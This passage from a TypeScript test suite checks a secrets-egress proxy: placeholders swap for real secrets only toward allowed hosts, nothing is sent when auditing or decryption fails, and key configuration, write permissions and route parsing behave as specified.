    expect(allowed("pypi.org, api.example.com, not a host")).toEqual([...RegistryEgress.HOSTS, "api.example.com"])
  })

  test("a decision Postgres refuses to record is never sent", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    const constraint = (statement: string) =>
      runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) => sql.unsafe(statement)))
    await constraint(`ALTER TABLE secret_events ADD CONSTRAINT no_use CHECK (action <> 'use') NOT VALID`)
    try {
      const answer = await h.egress(guest)(
        new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${placeholder}` } }),
      )
      expect([answer.status, await answer.text()]).toEqual([503, "audit"])
      expect(seen).toEqual([])
    } finally {
      await constraint(`ALTER TABLE secret_events DROP CONSTRAINT no_use`)
    }
  })

  test("a sealed value that doesn't open sends nothing", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    // A changed ciphertext fails authentication.
    await runtime.runPromise(
      Effect.flatMap(SqlClient.SqlClient, (sql) => sql`UPDATE secrets SET ciphertext = 'AAAA' || substr(ciphertext, 5)`),
    )
    const answer = await h.egress(guest)(
      new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([answer.status, await answer.text()]).toEqual([503, "secret"])
    expect(seen).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })

  test("a secret replaced while a request is in flight sends its old value to its old host, never its new value", async () => {
    // The replacement lands once the request's policy is read: deriving its placeholders is the seam.
    let midway = async () => {}
    const keys = Layer.effect(
      Keys.SecretKeys,
      Effect.map(Keys.make(KEY), (made) =>
        Option.some({
          ...made,
          minter: {
            ...made.minter,
            derive: (scope: string, name: string) =>
              Effect.andThen(
                Effect.promise(() => {
                  const replace = midway
                  midway = async () => {}
                  return replace()
                }),
                made.minter.derive(scope, name),
              ),
          },
        })),
    )
    const h = await open({ actor: admin, upstream, keys })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    midway = async () => {
      expect((await h.fetch(path(), put({ value: `${VALUE}-2`, hosts: ["files.stripe.com"] }))).status).toBe(202)
      expect(await rows(runtime)).toMatchObject([{ hosts: ["files.stripe.com"] }])
    }
    const request = () => new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${placeholder}` } })

    const answer = await h.egress(guest)(request())
    expect(answer.status).toBe(200)
    await answer.text()
    expect(seen.map((sent) => [new URL(sent.url).hostname, sent.headers.authorization])).toEqual([
      ["api.stripe.com", `Bearer ${VALUE}`],
    ])
    // The next request reads the replacement's policy: its value goes to its own host only.
    const after = await h.egress(guest)(request())
    expect([after.status, await after.text()]).toEqual([403, "host_not_allowed"])
    expect(seen).toHaveLength(1)
    expect(leaks(h.recorded(), [VALUE, `${VALUE}-2`])).toEqual([])
  })
})

describe("Keys", () => {
  test("SECRETS_KEY turns secrets on; without it, or with a short one, they are off", async () => {
    const read = (config: Record<string, string>) =>
      Effect.runPromise(
        Effect.service(Keys.SecretKeys).pipe(
          Effect.provide(Keys.SecretKeys.layerConfig),
          Effect.provideService(ConfigProvider.ConfigProvider, ConfigProvider.fromUnknown(config)),
        ),
      )
    expect(Option.isNone(await read({}))).toBe(true)
    expect(Option.isNone(await read({ SECRETS_KEY: "k".repeat(31) }))).toBe(true)
    expect(Option.isSome(await read({ SECRETS_KEY: "k".repeat(32) }))).toBe(true)
    expect((await Effect.runPromiseExit(Keys.make(Redacted.make("short"))))._tag).toBe("Failure")
  })

  test("only an Admin acting in person may write", () => {
    expect([admin, member, agent].map(SecretsApi.mayWrite)).toEqual([true, false, false])
    expect(Actor.canAsk(member)).toBe(true)
  })
})

describe("the route contract", () => {
  test("a secret's path round-trips; anything else isn't one", () => {
    expect(parseSecretRoute(secretRoute("o w", "n/x", "K"))).toEqual({ owner: "o w", name: "n/x", secret: "K" })
    expect(parseSecretRoute("/api/repos/o/n/secrets")).toBeUndefined()
    expect(parseSecretRoute("/api/repos/o/n/secrets/%E0%A4%A")).toBeUndefined()
    expect(SecretsApi.handles(SECRETS_SHAPE_ROUTE)).toBe(true)
    expect(SecretsApi.handles("/api/repos/o/n/tree/main")).toBe(false)
  })
})

/** The file's own schema name. */
const scratchName = async () => (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).name
